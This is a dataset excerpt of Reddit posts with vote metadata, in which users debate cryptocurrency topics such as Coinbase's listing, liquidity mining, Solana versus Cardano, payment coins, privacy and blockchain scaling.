Coinbase to go public this Wednesday (April 14th). What are the potential effects on the Crypto and DeFi ecosystem?,"on april 14th, coinbase, the largest us-based cryptocurrency exchange will go public via direct listing. as a centralized exchange, coinbase has a lot of fans as well as detractors but it’s popularity is in no doubt. last week, the company released their 2021 first quarter numbers and it blew expectations out of the water. they reported adding 13 million verified users since the end of 2021 and added 147.8% in total asset value held on the exchange. not only that, but they reported a whopping $1.8 billion in first quarter revenue, compared to $1.3 billion for all of 2020. those numbers are mind blowing and exemplify the massive growing interest in the cryptocurrency space. the biggest question at hand is: **what are some ways this could impact the crypto and defi space?** one major positive i can think of is that it will be a way to gauge the traditional markets interest in crypto-related companies and also helps to legitimize crypto in the world’s most important financial market. with robinhood planning to go public later this year and kraken in 2022, 2021 promises to be a big year in the traditional markets for crypto, which could lead to *a lot* more attention on defi as more traditional investors discover what they consider insane yields compared to their steady 7% apy growth. overall, i think the attention and new users this will bring is very bullish for crypto in general. for the sake of fairness, i also see what could be a negative as this could pull liquidity and capital away from pouring into the actual crypto market, as traditional investors could see investing in coinbase as sufficient exposure to crypto without the need to understand particulars about underlying assets. another thing that can't be ignored is that this is another instance of a centralized company making huge headways in a space that is known for decentralization. it's not inconceivable that coinbase could be researching their own chain similar to what binance has with bsc, which could threaten the defi space even more if it can provide yields attractive enough to prevent people from looking further into decentralized options. thoughts?",69,40,0.99,2021-04-11 15:10:41,web3,defi,charmcitycuddles,False,67.3

The underground culture of crypto and SOLs role in the space,"lately, a friend told me that meme tokens are like the underground culture of crypto. just like musicians release new music and records to keep their image relevant, meme coins keep our sol network buzzing. take kanye for example – you love him or hate him, but he stays in the public eye not just because of his music but also because of his character, collabs, and ye, even his twitter rants. similarly, meme tokens create a constant stream of drama and engagement within our crypto community. without this constant influx of new and often completely insane tokens, the solana network might risk fading into obscurity, overshadowed by other more hyped projects. just as kanye west would have been long forgotten if he stopped releasing music, solana might have struggled to maintain its position in the competitive crypto landscape without the buzz generated by meme tokens. honestly, meme coins like dogwivhat and ye wif hat are not what satoshi had in mind when he conceptualised btc. they may lack utility or serious underlying technology that many pioneer cryptos have. however, their increase in popularity can´t be denied. meme coins may seem like a burden to us old hands in the crypto space, but they serve a dual purpose. they provide us all wif entertainment and engagement to the community and they keeping existing ones active. we may not like it, but they contribute to the network's growth by increasing liquidity and trading volume, ultimately benefiting the entire ecosystem.",80,26,0.87,2024-04-27 10:31:49,web3,solana,dukebojack,False,67.1

The biggest challenge for cryptocurrencies and how to mitigate it,"i think the biggest challenge for cryptocurrency adoption will be bridging the gap between speculators hoping to make a profit and users who actually value the utility and aren't just hoping to make a buck. i think this is a bigger challenge than scaling (which will be eventually solved), or regulatory/taxation hurdles (which will eventually be worked out). the problem is as follows: 1. speculative holding and trading makes for extreme price volatility. 2. end users don't want this volatility and will hold crypto assets for the least possible time (max of seconds). 3. high user velocity results in low coin values for non burnable tokens, so coin values stay purely speculative. here are a few ways to attack the problem: **isolate volatility to service providers:** i think this is the most effective strategy. factom does this the best of any projects i know about. companies can pay a flat price for entry credits without ever needing to hold crypto. crypto exposure is only borne by service providers, who operate at market rates and should be willing to accept asset volatility. i think smart contract platforms like ethereum similarly can succeed by separating stakers and infrastructure type services from stable coins and other tokenized assets running on top. in the long run, i wouldn't expect owners of ethereum based insurance policies to be paid in eth, even if the smart contract is run on eth and eth is held as collateral. **burn-to-use tokens:** tokens that are burned when used should theoretically be more price stable because velocity isn't a factor in price. again factom is the project i think of with this feature, but there are other burn-to-use tokens. **hedging:** mechanisms to hedge prices may help spur usage, but i think in most cases the costs involved would overwhelm the benefits of having a cryptocurrency in the first place. i don't know of any projects that offer direct hedging, although decentralized exchanges like kyber and 0x may help facilitate these solutions. **getting such wide and general acceptance that prices stabilize:** theoretically if a cryptocurrency eventually gets to be so big that a majority of retailers and people are willing to accept it, prices should become as stable as any foreign fiat currency. in that state holding and shopping with bitcoin would be the equivalent of living in the us but being able to hold and spend euros. the problem with this is the chicken-and-egg problem in that you can't get wide acceptance when coins are only held by speculators. i think this will ultimately be the downfall of bitcoin, dash, raiblocks, and most other pure payment systems. iota has the same chicken-and-egg problem, so i think it's interesting that /u/davidsonstebo recognizes this and is taking steps to jumpstart acceptance including working with banks on quick exchange solutions, starting their own datamart, and convincing bosch to buy a number of iota to force start usage. we'll see if it works. most of the crypto projects i see don't have any realistic ways to tackle this problem and i think they are doomed to fail. are there any strategies i've missed or projects that attack this problem in a unique way?",75,31,0.96,2018-01-10 17:12:58,web3,CryptoTechnology,MerkleChainsaw,False,67.0

What is Liquidity Mining and How it Works?,"&#x200b; liquidity mining, also called yield farming, is a network participation strategy that allows you to provide liquidity (capital) to a liquidity pool on a decentralized exchange (dex). in return, you receive a reward from the specific liquidity pool to which you provided liquidity. depending on the farm, a user may also be rewarded in the native token or governance token of the protocol which allows you to vote and contribute to the protocol’s future. liquidity mining is important because a dex needs liquidity to enable the trades between different token pairs and this incentive strategy enables users to contribute liquidity to facilitate those trades. this means that the majority of liquidity pools are between trading pairs where users can deposit the two different cryptocurrencies depending on the pool. **benefits of liquidity mining** although liquidity mining is a means of earning a passive income, it has even more benefits. this section will discuss some relevant benefits of liquidity mining to both providers and decentralized exchanges. without further ado, let’s talk about the benefits of providing liquidity to dex. **1. fair and broad distribution of native tokens** introducing liquidity mining created an equal chance for both institutional and low-capital investors. depending on the protocol and the farm parameters, if you deposit money into a liquidity pool, you may receive rewards in the form of native tokens that you could use to vote. although liquidity mining minimizes favoritism, it’s important to note that distributing tokens to liquidity providers doesn’t end the inequality of token distribution. token distribution is still based on the concept that the higher the stake, the higher the reward. **2. a win-win situation for liquidity providers and decentralized exchange platforms** just as we already know, liquidity is the fuel on which decentralized exchanges run. so, as providers add liquidity to smart-contract protocols, the dexs that run the liquidity pools become more liquid. and, as a result, dexs continue to be liquid by making it possible for trustless individuals to transact securely. **3. nurturing a loyal community for a project** unlike in the ico era, where investors only focused on making returns on their investment, a liquidity mining program helps build a community that trusts and supports new projects. although the primary goal of liquidity mining is to create income for liquidity providers, it also helps develop active community members and a large user base for a project. in most cases, providers are likely to be token holders and users of the protocol after launch. there are many great liquidity mining platforms like compound finance, xsigma, aave, and more. compound finance is a popular platform that operates on the ethereum blockchain, xsigma is a stablecoin exchange and a liquidity mining platform backed by a public nasdaq-listed company, launched by world-class developers from xsigma labs and aave is another competitive market player in the defi sector that leverages the amm (automated market makers) smart contracts in a liquidity pool. have you tried any platforms yourself? i would love to know.",74,33,0.93,2021-11-25 05:51:58,web3,defi,LeomaDegnan,False,66.9

maybe cardano should use the label too when explaining why no one uses it. 6. becoming an ethereum validator also requires substantial wealth, whereas solana/cardano allow delegation, letting users vote for validators and capture network rewards/transaction fees. this is a better approach. ethereum lacks this option, and trusting lsts for staking is recognized as problematic in ethereum. solana lets users choose, with their money, who runs the network. they then are rewarded for that vote. solana’s setup isn’t much different then cardano here, but better than ethereum. yes, solana validators cost more to spin up, but are also rewarded for higher performance. one method solana is leveraging to stay ahead of demand. demand being an issue that cardano doesn’t face, and ethereum has outsourced to centralized l2s. 7. tps (transactions per second) metrics are nuanced and tracked by third party block explorers, which include vote and non-vote transactions. this makes sense for solana's consensus model. solana is currently pushing over 800 tps in non-vote transactions as i wrote this and is scaling to potentially reach 50k-200k with updates like firedancer. it likely already does around 2k-3k non-vote real world tps peak from what we see, but this doesn't account for the fact that solana can do more swaps with the same compute as cardano/ethereum as it was coded to be more efficient with popular types of transactions. there is a lot to understand here. simple fact is solana continues to scale their base layer to continue meeting new demand when cardano has no use for scaling and ethereum has abandoned base layer scaling for admin key controlled scaling solutions. solana is also scaling in more ways than one. 8. solana's circulating supply has increased due to early investment unlocks and higher inflation. early investments unlocks are winding down with some ecosystem exceptions, but the worst is over. keep in mind solana’s price performance even with increased circulating supply. solana’s inflation is now hovering around 3.5% per year and it decreases 15% year over year until it reaches 1.5%. while solana's inflation is definitely on the higher side, simple native staking can offset it. this is in contrast to ethereum where “staking” involves third-party trust and fees. stake your sol! cardano’s staking setup more closely resembles solana, but they have a finite supply. cardano also has a high concentration of early investors. probably on similar levels as solana. it has just had an extra cycle to flush some ada into new hands, but that doesn’t really matter if no one wants it. 9. a recent change on solana removed a burn mechanism attached to tipping to prevent side deals with validators, ensuring proper rewards and network health. a net positive fix. people realized they could tip outside the network to save by avoiding the burn. this hurt solana's incentives and reward mechanisms. a new burn to base level fees will need to be added for a more sensible approach. this will come. solana’s monetary policies are still maturing, and will need to fall more in line with ethereum’s aim to create a stable burn to emission ratio. cardano has no plans for this the last i checked which could be considered a problem for maintaining future security with low activity. you can’t have no new emissions while capturing no transactions fees and expect network validators to keep securing the network in a trusted way. 10. wealth concentration in networks is common, and this isn’t unique to solana. how much money are early investors of pre-mined eth sitting on? how much did those initial asian investors receive in ada? how much did whales purchase of all digital assets in bear markets? it's a problem with wealth gaps. the ftx estate already has new buyers locked, and they are going to sell when they want just like they would with any asset. institutional buyers have much stronger hands than your average crypto degen. institutional interest isn’t always bad. it's almost absurd to have to address these claims with long format, but the reality is that not enough people understand these networks. truth is, they all have their flaws, but they also excel in certain areas. despite its imperfections, solana is clearly leading in all metrics. cardano is so far behind that it's almost strange to compare the two. sure, cardano has strengths in decentralization design, but the fact that it still relies on admin keys doesn’t help their claims to superior decentralization. sol is consistently outperforming its competitors, capturing more activity and attracting developers from across the industry. posts like these are often driven by those clinging to underperforming altcoins, desperate to justify their choices. now, even some eth maxis are starting to face similar concerns by not diversifying. competition between solana and ethereum l2s is heating up.the fact is, if cardano was faced with solana’s level of activity, it would buckle under the pressure. it would be unusable. cardano users are also entrusting their funds to admin keys, and as the network inevitably transitions to l2s, those admin keys will be difficult to shake. a situation not unlike ethereum’s own l2 challenges. want the real reason for dave’s post wrapped up in one image? take a look at ada’s price compared to sol for the past 4 years: https://preview.redd.it/vwzsnwzh1iid1.png?width=3369&format=png&auto=webp&s=aa0d40d854cb5602a2bc91f57d758d23da6565c6",68,43,0.84,2024-08-13 17:34:10,web3,solana,Kumomax1911,True,66.4

Anyone else interested in Multi-Chain Architecture in Crypto?,"i have been getting more and more into multi-chain architecture and i stumbled upon a new layer 1 evm compatible called r/quainetwork that is building an incredibly interesting mulit-chain network. quai network is a hierarchy of merged mined blockchains that enables worldwide participation in web3.0 with low fees while maintaining decentralization. the protocol can scale horizontally to accommodate more users as network demand grows. this dynamic scalability paves the way for the next billion users to participate in blockchain based commerce. quai’s design utilizes a new concept called hierarchical merged mining (hmm). hmm allows miners to secure many chains at once while creating an interoperable multi-chain network with trust-less cross-chain interoperability. traditional layer 1s are struggling to provide adequate scalability resulting in high fees or centralization. by providing an innovative and scalable multi-chain solution, quai network is the first decentralized blockchain that can truly scale for worldwide adoption. quai's network of 13 chains, divided into the prime chain, 3 region chains, and 9 zone chains. this new network architecture enables greater capacity while maintaining composability, interoperability, and decentralization. quai organizes itself into a 3×3 hierarchical structure of chains. a blockchain is either a prime, region, or zone chain and has unique characteristics and utility. quai will launch with the single prime chain, 3 region chains, and 9 zone chains, and will be horizontally scalable based on network demand. the prime chain utilizes a hashing algorithm that is shared across subordinate chains. the network hierarchy is formed from 3 tiers of blockchains: prime, region, and zones. the lower chains (i.e. region and zones) have a higher throughput and lower difficulty than the prime chain. each region chain is a step up in the hierarchy from the zone chains. zone chains have the highest throughput and tps capacity, making them ideal for day-to-day transactions, contracts, and interactions. similar to how miners choose a region chain to mine, they also choose a subordinate zone chain to mine as well. thus, each miner ends up mining three chains: the prime chain, one of the three region chains, and one of the nine zone chains. quai network’s functionality revolves around the singular prime chain, mined by all quai network miners. coincident blocks link all chains which enables crosschain state transfers as well as periodic pegging of all chains to the prime chain’s total work. in order to create a seamless user experience, quai network’s modular chains have native interoperability. transactions and smart contracts in one chain can easily send to or receive from contracts in other chains. one of quai’s most exciting innovations is the ability to support decentralized cross-chain contracts and transactions. the modular nature of quai makes it possible for smart contracts and transactions to be deployed and referenced on all chains. for example, a smart contract deployed on one of the region chains (eg. hydra) could be invoked/referenced by a smart contract on a completely unrelated zone chain (eg. cyprus 1), fully maintaining composability throughout the network. the ability for all quai chains to natively interact has the potential to alleviate many of the scalability problems experienced by l1s as well as crowding, siloing, and liquidity fragmentation issues in l2s. this enables a seamless user experience throughout the quai network. quai network is fully evm compatible allowing any solidity contract to be easily ported and deployed. quai network recognizes that the vast majority of blockchain-focused developers are familiar with the evm ecosystem. quai network was built with evm compatibility to allow simple redeployment of existing dapps and contracts. by remaining evm compatible, quai network makes the process of building on quai as accessible as possible. as developers are the backbone of a layer 1’s retail value proposition, quai also plans to introduce out a variety of developer incentives to further encourage building projects on quai network. let me know what your thoughts are regarding multi-chain architecture or any other multi-chains i should look into.",69,42,0.75,2022-07-11 18:07:05,web3,CryptoTechnology,rkmoore3,False,65.7

Question about collision of private keys,"i understand that the probability for a collision of private keys (and therefore access to another persons wallet) is astronomically low. insanely, insanely low. but just as winning the lottery, getting hit by lightning, or life evolving on a planet from inanimate molecules, it happens. and just because the probability is low and on \*average\* it should take billions of years for a collision to occur, doesn't prevent it from happening in the next second. and if it does, we would blame it on the user. they leaked their seed. for public/private key encryption in general, i see that this is an easily acceptable risk, because even if two people were to generate the same private key by coincidence, the most probably wouldn't know of each other or be using it on the same systems, so it would never matter. with crypto currencies however, we are all using those keys in the same shared system. so if a collision happened, the effects would be noticed immediately. any thoughts? also, i think splitting your money across multiple wallets wouldn't change anything about the odds. you wouldn't lose everything at once, but you'd also increase the chance of a collision by having many private keys.",56,55,0.9,2021-05-22 04:18:53,web3,CryptoTechnology,armaver,False,64.6

"Decentralized cryptocurrency networks are hard. They're seeking to replace banking and national governments with a new world order
","decentralized networks are hard. their mission goes far beyond optimizing payment systems or increasing transaction speed — they're built to challenge the fundamental structures of banking and governance. where most projects chase high throughput at the cost of centralization, networks like ethereum take a harder path: prioritizing censorship resistance and economic resilience over convenience. to take the ethereum example further: its scaling roadmap isn’t focused on maximizing raw throughput at any cost. instead, it’s built around innovations like rollups and eip-4844, which have already slashed fees by 100x, while keeping decentralization front and center (source: https://l2fees.info, https://l2beat.com/scaling/summary). this approach sets it apart from high-throughput chains that prioritize speed over security, often compromising their core principles. the broader digital asset economy reflects this commitment to decentralization. over two-thirds of the total value locked (tvl) in defi sits on ethereum and its layer 2 solutions (source: https://defillama.com/chains). it’s the core of the defi ecosystem, attracting the bulk of development and liquidity. but it’s not alone — other decentralized projects like cosmos are employing their own strategies for achieving scaling without sacrificing the decentralization ethos of crypto. security is where the difference becomes most apparent. the cost to attack decentralized networks like ethereum is astronomical — over $34 billion to execute a 51% attack, far exceeding the cost for more centralized competitors (source: https://unchainedcrypto.com/51-attacks-on-bitcoin-and-ethereum-impossible-coinmetrics/). this quantifies the benefits of building a truly decentralized, censorship-resistant network. this is what separates decentralized networks from their high-throughput counterparts. they aren’t designed to be just another financial tool — they’re built to embody the principles of economic liberty and individual sovereignty. the question isn’t whether they can handle more transactions per second; it’s whether they can stay true to their mission as they scale, resisting the centralizing forces that have captured traditional financial systems. whether decentralized networks like ethereum remain niche experiments or become the backbone of a new world order depends on their ability to execute on their mission of providing decentralization at scale. but one thing is clear: they’re built differently. they’re not here to recreate old systems with new tech—they’re here to redefine what’s possible, aiming for a digital, censorship-resistant economy that puts power back in the hands of individuals.",58,54,0.81,2024-11-18 03:33:27,web3,CryptoCurrency,aminok,False,64.5

"Do any of you foresee a crypto being widely adopted as a general purpose payment coin? nano, btc, btccash etc (take your pick). I think it won't happen for reasons in this post. What do you think?","what do you all think of payment coins in general? i've got a list of points why this wont happen, i mentioned them in the thread on this sub, asking if btc deserves its market cap. figured it might deserve its own post. i think a payment coin (btc, nano, btccash, etc) being widely adopted as an alternative to fiat payment wont happen for the following reasons: - cryptos are volatile in value relative to your fiat. if you intended to use it as general payment e.g. buying coffee or a laptop online. the fluctuations in value especially crashes really suck, especially if you have large sums of money there. oh i cant buy that laptop now because my crypto has fallen by 30%. satoshi said that volatitily would stabalise over time with btc, but i disagree with this, just my opinion, its been 9 years of btc with high volatility, with very few using for adoption in gen payment, btc does 200k transactions a day, its mainly investors and people using it as a trading pair for alts on exchanges. - you have no charge backs like with a credit card or pay pal if the merchant does something wrong. so why would i use a payment coin that has no chargebacks if there is no cost advantage? the visa fee is something like 2-3% more if its forex. however the merchant eats the fee. even if the merchant offered a discount for using crypto to buy something, point 1 is still a huge issue, and the savings the merchant would offer probably would not be enough incentive e.g. 2-3% in most cases. - with cryptos, you need to be your own bank, securing cryptos isn't hard, but not user friendly to people who are not tech literate, however big strides have been made there with easy to use wallets. however there is still the potential for phishing, losing keys etc. visa card, no problem, call up the bank, cancel the card get a new one. the bank will refund any money spent by someone who stole you card, at least here in australia. - most payment coins are not not fungible e.g. btc except monero, this means that the btc you used can be traced back to some nefarious activity, a drug deal etc. this could land you in hot water, but not likely. however it would give pause for adoption by merchants. e.g. people could be laundering btc through them to say buy macbook pros and sell them on ebay. - in the case of btc and public block chains as soon you spend btc, people know your wallet address, they now know your balance. even if you try to hide your balance with multiple wallets and transfers, block chain analysis will find where the jackpot is. if they are motivated to do so, perhaps they know you might have a lot of btc for example. coin mixers no longer work. this is a huge problem. monero does not have this problem however as do some of the other private payment coins. - in the case of btc, it has slow confirmation times and expensive transaction fees, though this could be fixed with ln. other payment coins like nano do not have this problem, thought i would still add this as a point. i guess this is not really a point to stop adoption. but i added it here as people generally only know about btc. - we can see in the case of btc, it was never really adopted for general payment. most use it as an investment, to buy alts, or people who choose to use it as payment over fiat if its available, id classify these people as being enthusiastic about using crypto, but you can see in the case of btc, over the years, most people didnt use it for this purpose. btc was used in darknets however. this is why i invested in monero as i saw the flaws in btc (lack of annonymity, and fungibility) and figured darknets would eventually adopt monero in the long term. - didnt add this in my first post, but a problem i have with payment coins is that they are also deflationary as they have a fixed supply. libetarians love the idea of hard money that can not be printed, but i think most have not studied up on modern economics and different schools of thought; keynesian principles are the dominant thinking, the money supply should expand with the increased goods and services produced in the economy i.e. increases in gdp should ideally expand the money supply. you also have the austrian school that stipulates that gold or a fixed supply asset tied to money is better, i dont really agree but they do bring up some good points in some respects with smoothing the economic boom / busts, but i wasnt sold. deflation in a payment crypto is bad, it encourages hording as the value will go up as more people are chasing less btc as an example. you want moderate inflation as it would actually encourage people to spend or invest as holding onto the crypto would see a steady loss of 2-3% a year, omitting price volatility i mentioned in point 1. perhaps the volatility however would be less with inflationary coins. this was a problem with the gold standard and why they abandoned it. this is a controversial topic. as many people believe that governments are stealing money via inflation through seigniorage i..e they print it first so they get the most value before it gets further inflated. this is really more applicable to countries who print money to fund their government, which isnt applicable to modern economies. it is an issue in some countries with very high inflation that do just this. ive mentioned monero. (not trying to shill here, insert other private payment coin here) it has the flaws of point 1 which is huge, so wont be adopted widely for general payment. however its fungible, people cant look up how much you own. transactions are anonymous. so even with the problem with point 1. privacy even at a cost has value and good use cases. hiding money from the govt, transferring it overseas. nefarious activities, e.g. buying drugs online. but those are niche use cases. so i dont ever see monero or another private coin being adopted for general payment either. if a payment coin can some how exist in the future where it resolves the points i mentioned e.g. holding its value to fiat, then id be interested. however maintaining the value of a crypto relative to fiat would require financial instruments like hedging which would increase the cost of using the crypto for payment thus potentially making it moot for general payment for any cost advantage. the charge back problem could be solved by say a company providing an equivalent type of crypto credit card without credit (or with credit), but this would incur cost of using the crypto, banks make this money back with interest, which is very high, credit cards its 25% or so in australia. so given all these points, and the above paragraph where i see the only feasible way a general payment coin can exist (which would render using crypto in the first place pointless). do you agree? or think that its possible for the wide adoption of a crypto for general payment? edit, i realise that there is more to crypto then payment which many cite without addressing my points, i find payment coins the least promising out of them. dapps and remittance focused coins for sure. other platform based ones like oyster too, perhaps icon and ark but i need to get a better understanding of them. right now i own xrp, xlm, xmr, ada, eth, prl, iota (possibly payment yes, but has data storage on the tangle thus is useful in other protocols as its ideal for static data storage and retrieval e..g video streaming, oyster pearl is using the tangle for just this reason), neo and ont.",57,53,0.86,2018-04-07 23:51:59,web3,CryptoTechnology,Neophyte-,False,64.0

Crypto Privacy Solutions,"privacy has become increasingly relevant in crypto.. while privacy is considered an essential aspect of tradfi , it is often misunderstood and misrepresented in decentralized systems. as the cryptocurrency industry grows, we must define financial privacy in crypto and develop innovative solutions to manage it. it is crucial to emphasize that privacy in crypto is a fundamental requirement to mainstream user and business buy-in rather than a mere nice to have feature. we cannot expect tradfi volumes in defi if we don’t offer tradfi level privacy. for example, fund activity will be limited as long as their defi alpha is leaked with every transaction they make on-chain.contrary to popular belief, crypto transactions are not anonymous.. as regulators increase their oversight and blockchain network analysis tools become more sophisticated, the lack of privacy in crypto has become more detrimental. in blockchain development, developers have to prioritize between security, decentralization, and scalability, and privacy is not typically one of the primary considerations. programmable privacy is an emerging sector of research and development that is being implemented in public blockchains to ensure more secure, scalable, and private-yet-compliant transactional volume. zero-knowledge proofs (zkp) technology is one such example. a zkp is a method by which one party can prove to another party that something is true without revealing any additional information. this technology is crucial for supporting use cases that require information to prove statements of truth, without revealing information that isn't relevant. zkps are great for privacy because you can assert that you are entitled to send a transaction (i.e., own the assets on-chain) without revealing who you are, what those assets are, or what your transaction history is. zkps can be built into evm chains and provide account level privacy whilst still maintaining protocol level transparency. in conclusion, financial privacy is a right that must be protected, and there are tools being researched and developed to ensure this right also applies to crypto. the industry needs to prioritize privacy before it's too late. education and engagement at the regulatory level are also essential to showcase the benefits of emerging privacy technologies like zkp.",67,36,0.94,2023-03-27 06:42:12,web3,CryptoTechnology,el1u2ryf,False,63.99999999999999

Binance's woes are why distributed database technologies are desperately needed,"as alot of people might have heard, binance downtime will be nearly a day (correct me if i'm wrong). the problem looks to have stemmed from a replicated database (primary to replicas). while this is in theory a great setup, as it keeps the site resilient, clustering in many cases has often caused more pain than it's solved. cloud providers can mitigate alot of this risk by providing streamlined, high-availability services. this is often a much better solution than the do-it-yourself model. however, the problem with that is you're still relying on a centralized model to handle your data and also you have to trust them to keep your infrastructure running. there are quite a few projects out there that are trying to tackle this, both at the database layer and the physical storage layer. a set of data distributed over thousands, even millions of nodes, is extremely resilient. the challenge here will be scaling the solution up. if you take a look at bitcoin's infrastructure, there is a sync time, depending on hardware, that can take a day or more to completley replicate the blockchain. bitcoin is using a 7 year old release of berkeley, which is only around 160gb or more. the challenge remains, how can we: * scale a distributed database up into the tbs and pbs? * increase the sync time of a new node that joins the network? * vitalik is looking at sharding to help solve these types of issues, but that can be difficult when you're trying to create an acid compliant data set. i'm confident these challenges can be overcome, and we truly will have a ""world supercomputer,"" with a highly scalable database, within 5 years. what other solutions are out there right now trying to tackle this problem?",70,31,0.95,2018-02-08 22:15:44,web3,CryptoTechnology,crypto_kang,False,63.9

"Noticed the huge rise of EOS lately what does it have over NEO and ethereum and to a lesser extent Cardano? I tried researching it, but wasn't sold.","i tried to research the differences, but i dont really see anything that makes it a huge selling point over neo in particular, and ethereum is improving with a solid road map, plasma and sharding for example. in terms of consensus, i see that eos is using dpos, but eth is moving to pos anyway, neo uses dbft which is faster anyway. on that note, is dpos dangerous? delegating block creation to a few nodes makes me wonder if changes to eos may be hard to implement e.g. a delegate decides they don't like risking a hard fork, or is this a moot point and not a risk with dpos? what eos has is 0 transaction fees, so thats a good pro in their book. they also talk about the async nature of their dapp communication with transactions. but who cares? i think this pattern is easily implemented in other dapp protocols, i think its analogous to async / await patterns you see in programming langauges .net and the new ecma standard, im sure other langauges have the same thing. i noticed that eos is limiting the ""chattyness"" on there launch, dapps can only have 40 messages in a transaction (i read this last night, so i'm probably not articulating this correctly). this seems to be a way to ensure the network is not bogged down by dapps, but i dont think its the right way to go about it. i think allowing off chain processing like ethereum is planning with plasma much better. thats just my thinking, i could be way off, so correct me if im wrong. on that note of chattyness, how is cpu, transactions, memory usage controlled to handle the network? we have gas in ethereum. how does it work in eos? i couldn't find an answer. when it comes to programming languages, im not too fussed, they are promoting that their languages in eos compile into c++, which is great. but solidity has great performance too. infact, i think the programming languages available to build a dapp is over rated as a selling point. you can compile into native with many languages. you do have the special case with functional langauges like haskell in cardano, functional langauges generally lead to code that has less bugs, much steeper learning curve than imperative languages however, but i dont see that as being a problem. overall, i don't see massive pros in eos vs neo and ethereum (with its upcoming changes). cardano i mentioned because it has a great white paper, but at this stage they havent delivered much and might be too late. i know this is a dyor, but whats the rollout like for eos? i don't believe its a working product yet, while neo and eth are. the thing with smart contracts protocols is that they can just implement ideas from other smart contract coins, however its always good to have these from the begining, to avoid forks. but even so i think the network effect of eth and neo will dominate the space unless eos and cardano can get in quick with a good use case to use them as a dapp platform, as neo and eth will improve over time. of course people could migrate their dapp later when a better smart contract platform comes around. but i imagine thats not easy when you've already established yourself on one dapp platform (am i wrong?) thoughts? i'm scratching my head at why it just blew up. doesnt seem to offer anything mind blowing over existing working product smart contract coins.",57,53,0.84,2018-03-24 18:12:11,web3,CryptoTechnology,Neophyte-,False,63.8

(cardano, iota, zilliqa) however, this isn't the case for our 1st generation blockchains unfortunately. in fact, they have decided to solve the scalability problem with an off chain solution, the lightning network. while doing research on it, i found numerous posts specifying a myriad of flaws in the lightning network's concept and implementation. more specifically, within these 3 sources 1. a collection of all the flaws in the white paper https://www.np.reddit.com/r/btc/comments/71i6y3/a_brief_teardown_of_some_of_the_flaws_in_the/?st=jfi7prn9&sh=02722e1b 2. a quick summary of the major ln flaws https://www.np.reddit.com/r/cryptocurrency/comments/874clf/comment/dwacpus?st=jfi7odzq&sh=5e7962e9 1. a description of an attack to steal 400 btc from users through the lightning network https://www.np.reddit.com/r/bitcoinmarkets/comments/84n8l0/comment/dvs4n25?st=jfi7qhq2&sh=dc3588b1 this brings me to the conclusion that the lightning network makes bitcoin heavily insecure. is anyone informed about this and can say if these claims are legitimate? .",49,66,0.76,2018-04-02 08:44:40,web3,CryptoTechnology,galan77,False,63.4

"Cryptocurrencies as currencies in real life environments, a discussion.","*disclaimer: i'm just here throwing ideas around and want to spark debate and incentivize discussion. i am probably in no way correct or trying to state any facts.* #government issued currencies versus cryptocurrencies today, i was browsing reddit when i came upon a post criticizing cryptocurrencies and saying that government-issued currencies were clearly superior. the argument was that you can't buy everything, everyday stuff with any cryptocurrency and that nobody was being paid in cryptocurrencies, simply because they were too volatile, and that the only usecase they have is pure speculation. while 1 sat will always be 1 sat, the worth of 1 sat in every other currency in the world fluctuates wildly. this reminded me of the in(famous) bitcoin black paper by nassim taleb. he argued that you can't do trade with bitcoin or any other volatile crypto because you would need to pay your supplier in crypto, and crypto might go up or down a lot, and that isn't good for doing business. (not exactly his words, but you get the point). #**so, what's the solution?** i was thinking about stablecoins. what about stablecoins, then? but, the problem with stablecoins is that they bring us back to square one: why not just use fiat directly? brian armstrong was talking about this, fiatcoins vs flatcoins. fiatcoins are pegged to a currency, while flatcoins aren't pegged to any currency, but still remain *somewhat* stable. >two kinds of stablecoins. >fiatcoins are pegged to an external fiat currency like usd, directly or indirectly. >flatcoins are newer. if fiat itself starts to inflate, it isn’t really “stable”. so a flatcoin optimizes instead for price flatness vs an on-chain basket of goods. *source: https://twitter.com/balajis/status/1402030233319088139?s=19* the only problem with flatcoins is that they still fluctuate a lot compared to stablecoins, and as far as i'm aware, most of them don't have a usecase other than being a hedge against inflation inside the crypto world. #the big question is there any cryptocurrency used today to save, spend and be paid in, in the real world? yes, but no. the only crypto i'm aware is being used to buy bread at the local bakery, used to get a haircut, ride a taxi or be paid in is rsv in venezuela. the reserve team released an app that let's people convert hyperinflated bolívares into rsv, a fiatcoin pegged to the usd, that aims to depeg from it and track a basket of assets, but the transition from fiatcoin to flatcoin is still a long ways ahead. and not only that, but the app isn't transacting on-chain yet, so it's centralized in the meantime (although they intend to transact on-chain and give users self-custody once the reserve protocol mainnet releases). *if you want to learn more about reserve: https://reserve.org/project/* #my humble take, as someone still learning real, massive, everyday use crypto adoption as currencies will come in the form of a decentralized, stable, backed crypto**currency** that isn't pegged to anything but it's something in itself, essentially creating the crypto bretton woods *basket* standard. to close this post, i'm going to quote none other than vitalik himself: >the latter because i'm thinking about stablecoins. some people think stablecoins are purely transition tech, and post-hypercryptoization btc or eth will be stable. i think there's a big chance this is wrong and even post-hypercryptoization we would still need explicit stablecoins *source: https://twitter.com/vitalikbuterin/status/1433198571117895680?s=19* *disclosure: i am personally invested into the reserve protocol ecosystem.*",63,39,0.96,2021-09-26 14:37:24,web3,CryptoTechnology,AlexxLopaztico02,False,63.0

The Sad State of Smart Contract Protocols,"reminder: don't downvote this post because your favorite shitcoin is getting bashed, how about you upvote it so people who actually have something to say see it and can defend some of the statements in this post. --- >ethereum 2 amazing first step and should be seen as just that, a first step, not only will it never be scalable, because sharding pos is really hard, if shards can ""send work"" from one shard to another, it's near impossible for the shards to be ""equals"" as it injects a massive new economic incentive system at the validator level -- one example off the top of my head is that validators can now collude to arbitrage failures in the gas model. the eth 2.0 people have some magic fairy dust idea, the cosmos people are grounded in reality that sharding+pos doesn't work, so they got for a hub-spoke model (layer-1 single chain, layer 2 spokes), and every other project falls somewhere in between. i have zero idea how pos's security doesn't degrade as a pos attempts to scale up. pos already has massive security problems that sharding exacerbates dramatically however, eth is going to be around forever, much like btc. it's the scaling and the limits of solidity that will hold it back from real ""change"". that doesn't mean it can't be a great showroom for the early phase of defi. moreover, solidity is just a monster to develop in so when we're talking big money dapps they can't advance too much too fast, it's just not safe. --- >layer 2 (matic arbitrum etc) overall, all layer two solutions have their place but aren't the solution, just a solution that make sense for specific ecosystems and contexts, and not as a general solution to scaling. i doubt if eth demanded a sidechain for dapps we'd have seen the explosion in innovation that we've seen over teh past 5 years. moreover, if you use layer2 solutions, at some point they need to settle through the base layer1 to move funds/etc around to a different layer2 app... you can't really go layer2->layer2 direction, mainnet settlement is needed (layer2->layer1->layer2). if layer1 isn't scalable, then at some point, assuming adoption takes place, layer1 will get congested enough that fees on txs go through the roof. the biggest unsolved 